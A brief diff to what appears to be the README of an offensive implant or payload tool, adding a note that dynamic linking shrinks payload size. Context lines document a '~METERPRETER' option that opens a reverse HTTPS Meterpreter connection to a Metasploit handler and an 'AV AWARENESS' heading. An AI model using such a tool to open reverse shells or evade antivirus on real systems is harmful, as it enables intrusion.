@@ -56,7 +56,9 @@ Options :
 
 ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit
 
+# NOTE
 
+- Dynamic linking makes payload size smaller !
 
 # AV AWARENESS
 
